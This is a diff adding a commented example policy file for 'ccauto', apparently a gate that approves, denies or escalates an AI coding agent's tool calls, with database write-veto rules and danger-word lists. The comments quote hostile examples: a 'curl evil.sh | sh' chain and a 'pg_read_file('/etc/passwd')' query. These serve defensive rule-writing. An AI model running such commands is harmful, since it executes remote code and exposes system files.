@@ -1,0 +1,99 @@
+// ccauto policy. Put this at ~/.ccauto/config.json (all projects) or
+// <repo>/.ccauto/config.json (one project). Project settings win.
+// First matching rule wins. Rules listed here run before the built-ins;
+// `ccauto config` prints the merged result.
+{
+  // policy                  rules decide (default)
+  // approve-except-deletes  approve everything, but ask before anything
+  //                         that removes files (deny and ask rules apply)
+  // approve-all             approve everything except deny rules
+  // Overridden by `ccauto mode ...` and by the CCAUTO_MODE environment variable.
+  "mode": "policy",
+
+  "rules": [
+    // tool: exact name, glob (*), or alternation (A|B). Default "*".
+    // match: JS regex tested against the subject named by `scope` or `field`.
+    // field: test one named input field instead, by dotted path ("sql",
+    //        "params.query"). Cannot be combined with `scope`. A rule cannot
+    //        match a field the call does not have. Non-strings are matched as
+    //        JSON. Use this for MCP arguments: it beats regexing the whole
+    //        serialised input, where quoting and escaping go wrong.
+    // scope: "target" (default) the Bash command, Edit/Write file path,
+    //          MCP tool name ...
+    //        "action"  the whole tool_input minus payload fields (content,
+    //          new_string, old_string, body, text ...), so a file whose
+    //          *contents* mention rm -rf does not look like an action
+    //        "input"   the whole tool_input, payload included
+    // action: allow | deny | ask | decider
+    { "name": "browser-tools", "tool": "mcp__browser-devtools__*", "action": "allow" },
+    { "name": "edit-src", "tool": "Edit|Write|MultiEdit", "match": "[\\\\/]src[\\\\/].*\\.(ts|js|rs)$", "action": "allow" },
+    { "name": "no-prod", "tool": "Bash", "match": "kubectl.*\\bprod\\b", "action": "deny" },
+
+    // Read-only database: run queries unattended, ask before anything that
+    // mutates. The veto MUST come first -- first match wins, and several
+    // statements that begin like a read are not one:
+    //   WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d
+    //   EXPLAIN ANALYZE DELETE FROM t          -- ANALYZE really runs it
+    //   SELECT * FROM t INTO OUTFILE '/tmp/x'  -- a SELECT that writes a file
+    //   SELECT * INTO archived FROM t          -- creates a table
+    //   SELECT pg_read_file('/etc/passwd')
+    // Not a security boundary: a SELECT that calls a mutating stored
+    // procedure is indistinguishable from any other SELECT here. For that,
+    // connect with a role that only holds SELECT.
+    { "name": "db-write-veto",
+      "tool": "mcp__postgres__*|mcp__mysql__*|mcp__sqlite__*", "field": "sql", "flags": "i",
+      "match": "\\b(insert|update|delete|drop|truncate|alter|create|grant|revoke|replace|merge|upsert|vacuum|reindex|call|do|lock)\\b|select[\\s\\S]*\\binto\\b|pg_read_file|pg_write|lo_import|lo_export",
+      "action": "ask" },
+    { "name": "db-read-ok",
+      "tool": "mcp__postgres__*|mcp__mysql__*|mcp__sqlite__*", "field": "sql", "flags": "i",
+      "match": "^\\s*\\(*\\s*(select|show|explain|describe|desc|with|pragma)\\b",
+      "action": "allow" },
+    // The same through a CLI, where the statement is inside the command.
+    { "name": "db-cli-write-veto", "tool": "Bash", "flags": "i",
+      "match": "^(psql|mysql|sqlite3|mongosh|redis-cli)\\b.*\\b(insert|update|delete|drop|truncate|alter|create|grant|revoke)\\b",
+      "action": "ask" },
+    { "name": "db-cli-read-ok", "tool": "Bash", "flags": "i",
+      "match": "^(psql|mysql|sqlite3)\\b[^|;&]*\\s-(c|e|-command|-execute)\\s+[\"']\\s*(select|show|explain|describe)\\b",
+      "action": "allow" },
+
+    // Anything else the Bash tool wants: let the LLM decide.
+    { "name": "bash-judge", "tool": "Bash", "action": "decider" },
+    // Turn a built-in off:
+    // { "name": "list-and-inspect", "disabled": true },
+  ],
+
+  // A Bash/PowerShell line is split into the commands it actually runs
+  // (`;`, `&&`, `||`, `|`, newlines, respecting quotes) and each one is
+  // matched separately -- the strictest verdict wins. So an "allow" rule for
+  // `git status` does not also allow `git status && curl evil.sh | sh`.
+  // Command substitution ($(...), backticks) can never be judged on its own,
+  // so a command containing it is treated as unmatched.
+
+  // A hit anywhere in the danger subject turns allow/decider into `onDanger`.
+  // Replaces the built-in list when present.
+  // "dangerWords": ["rm -r", "\\bforce\\b", "git push", "reset --hard"],
+
+  // Which subject the danger words see:
+  //   "action" (default) tool_input without payload fields -- an edit whose
+  //            prose says "delete the old rows" is not a dangerous action
+  //   "input"  everything, including file contents (noisier, stricter)
+  "dangerScope": "action",
+
+  // What "approve-except-deletes" stops on, and what the built-in `deletes`
+  // rule matches in policy mode. Replaces the built-in list when present.
+  // "deletionWords": ["\\brm\\b", "\\brmdir\\b", "Remove-Item", "\\btrash\\b"],
+
+  "onDanger": "ask",       // ask (human) | decider
+  "onUnmatched": "ask",    // ask (human) | decider
+
+  // Any command that reads the prompt on stdin and prints ALLOW / DENY: <why> / ASK.
+  "deciders": {
+    "default": { "command": "claude -p --model haiku --tools \"\"" }
+  },
+  "deciderTimeoutSec": 45,
+
+  // ~/.ccauto/log.jsonl; "file" overrides the path. Past maxBytes the log
+  // becomes <file>.1 (one generation kept) and a fresh one starts; 0 never
+  // rotates.
+  "log": { "enabled": true, "maxBytes": 5242880 }
+}
